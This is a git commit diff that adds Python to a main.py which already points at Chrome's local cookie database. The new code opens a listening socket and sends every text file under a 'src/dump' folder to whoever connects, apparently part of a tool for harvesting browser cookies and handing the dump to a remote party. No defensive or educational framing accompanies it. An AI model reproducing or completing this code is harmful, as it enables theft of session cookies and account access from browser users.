50dc35c14ba4312daa44bfc3a4195aa66cbf20ac
c-livi <121881563+c-livi@users.noreply.github.com>
2023-01-05 13:40:46 -0500

    Update main.py

--- main.py
+++ main.py
@@ -1,1 +1,26 @@
+import os
+import time
+import importlib
+import socket
+
 cookie_dir="%LocalAppData%\Google\Chrome\User Data\Default\cookies"
+
+def sendDump(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('', port))
+    s.listen(1)
+    c, addr = s.accept()
+    print("CONNECTION FROM:", str(addr))
+
+    def send_txt_file(conn, filename):
+        with open(filename, 'r') as f:
+            contents = f.read()
+            conn.send(contents.encode())
+
+    for root, dirs, files in os.walk("src/dump"):
+        for file in files:
+            if file.endswith(".txt"):
+                send_txt_file(c, os.path.join(root, file))
+
+    c.close()
+	
